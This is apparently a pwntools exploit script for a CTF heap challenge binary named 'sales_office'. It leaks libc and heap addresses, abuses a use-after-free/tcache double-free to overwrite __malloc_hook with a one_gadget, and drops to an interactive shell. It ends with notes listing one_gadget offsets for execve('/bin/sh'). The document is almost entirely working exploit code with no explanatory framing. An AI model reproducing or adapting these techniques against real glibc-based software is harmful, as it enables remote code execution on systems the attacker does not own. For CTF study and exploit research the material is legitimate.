#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('./sales_office')
	elf = ELF('./sales_office',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so',checksec=False)

else:
	p = remote()
	elf = ELF('',checksec=False)

def menu(command):
	ru("choice:")
	sl(str(command))

def add(size,content):
	menu(1)
	ru("house:")
	sl(str(size))
	ru("house:")
	sd(content)

def delete(ID):
	menu(4)
	ru("index:")
	sl(str(ID))

def show(ID):
	menu(3)
	ru("index:")
	sl(str(ID))


###leak libc###
add(0x20,'AAAA')#0
add(0x20,'BBBB')#1

delete(0)
delete(1)

add(0x10,p64(elf.got['puts']))#2
show(0)

puts = u64(ru('\x7f')[-6:].ljust(8,'\x00'))
libc_base = puts - libc.symbols['puts']
one_gadget = libc_base + 0x4f322
malloc_hook = libc_base + libc.symbols['__malloc_hook']


###leak heap###
arena = 0x6020A0
add(0x30,'CCCC')#3
add(0x30,'DDDD')#4

delete(3)
delete(4)

add(0x10,p64(arena))#5
show(3)
ru('house:\n')
heap = u64(rv(4).ljust(8,'\x00')) - 0x260
###double free###
add(0x40,'EEEE')#6
add(0x40,'FFFF')#7

delete(6)
delete(7)

add(0x10,p64(heap + 0x380))#8 now struct 6 point tcache chunk
delete(6)

add(0x30,p64(malloc_hook))#8
add(0x30,p64(malloc_hook))#9

add(0x30,p64(one_gadget))

'''
##double free###
add(0x10,'AAAA')#3
add(0x10,'BBBB')#4

delete(3)
delete(4)
delete(3)

add(0x10,p64(malloc_hook))

gdb.attach(p)
'''
###get shell###
ia()


'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''